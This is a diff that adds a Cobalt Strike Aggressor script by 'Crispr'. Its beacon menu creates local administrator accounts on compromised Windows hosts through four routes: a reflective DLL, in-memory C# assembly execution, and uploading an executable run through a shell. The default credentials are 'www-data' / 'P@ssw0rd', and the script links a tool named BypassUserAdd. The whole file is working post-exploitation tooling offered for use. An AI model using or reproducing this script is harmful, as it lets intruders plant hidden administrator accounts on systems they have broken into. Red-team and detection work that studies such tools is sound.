@@ -1,0 +1,82 @@
+popup beacon_bottom{
+    menu "UserAdd" {
+        item "Reflection NetUserAdd" {
+            $bid = $1['@'];
+            $Dialog = dialog("Add Administrator User",%(username => "www-data", passwd => "P@ssw0rd", bid => $bid),&add_localuser);
+            dialog_description($Dialog, "Reflective NetUserAdd By Windows API NetUserAdd");
+            drow_text($Dialog, "username", "username: ");
+            drow_text($Dialog, "passwd", "passwd: ");
+            dbutton_action($Dialog, "RUN");
+            dialog_show($Dialog);
+        }
+
+        sub add_localuser {
+            local('$Name');
+            $Name = $3['username'];
+            $Pwd = $3['passwd'];
+            $args = $Name." ".$Pwd." 1";
+            bdllspawn($bid, script_resource("ReflectiveDll.x64.dll"), $args, "ReflectiveDll", 5000, false);
+        }
+
+        item "Reflection SelfBuild NetUserAdd" {
+            $bid = $1['@'];
+            $Dialog = dialog("Add Administrator User",%(username => "www-data", passwd => "P@ssw0rd", bid => $bid),&add_localuser_t);
+            dialog_description($Dialog, "Reflective NetUserAdd By Rebuild API NetUserAdd(*Recommand)");
+            drow_text($Dialog, "username", "username: ");
+            drow_text($Dialog, "passwd", "passwd: ");
+            dbutton_action($Dialog, "RUN");
+            dialog_show($Dialog);
+        }
+
+        sub add_localuser_t {
+            local('$Name');
+            $Name = $3['username'];
+            $Pwd = $3['passwd'];
+            $args = $Name." ".$Pwd." 2";
+            bdllspawn($bid, script_resource("ReflectiveDll.x64.dll"), $args, "ReflectiveDll", 5000, false);
+        }
+
+        item "C# DirectoryAddUser" {
+            $bid = $1['@'];
+            $Dialog = dialog("Add Administrator User",%(username => "www-data", passwd => "P@ssw0rd", bid => $bid),&add_localuser_c);
+            dialog_description($Dialog, "C# DirectoryAddUser which can used be execute-assembly(*Recommand)");
+            drow_text($Dialog, "username", "username: ");
+            drow_text($Dialog, "passwd", "passwd: ");
+            dbutton_action($Dialog, "RUN");
+            dialog_show($Dialog);
+        }
+
+        sub add_localuser_c {
+            local('$Name');
+            $Name = $3['username'];
+            $Pwd = $3['passwd'];
+            $args = $Name." ".$Pwd;
+            bexecute_assembly($bid, script_resource("bin/DirectoryAddUser.exe"),$args)
+        }
+
+        item "SelfBuild NetUserAdd" {
+            $bid = $1['@'];
+            $Dialog = dialog("Add Administrator User",%(username => "www-data", passwd => "P@ssw0rd", bid => $bid),&add_localuser_u);
+            dialog_description($Dialog, "upload SelfBuild NetUserAdd.exe");
+            drow_text($Dialog, "username", "username: ");
+            drow_text($Dialog, "passwd", "passwd: ");
+            dbutton_action($Dialog, "RUN");
+            dialog_show($Dialog);
+        }
+
+        sub add_localuser_u {
+            local('$Name');
+            $Name = $3['username'];
+            $Pwd = $3['passwd'];
+            $cmd = "SelfBuildAPIAddUser.exe ".$Name." ".$Pwd;
+            
+            bupload($bid, script_resource("bin/SelfBuildAPIAddUser.exe"));
+            blog($bid, "Github Address：https://github.com/crisprss/BypassUserAdd")
+            bshell($bid, $cmd);
+        }
+
+        item "Author: Crispr" { 
+            url_open("https://www.crisprx.top/"); 
+        }
+    }
+}
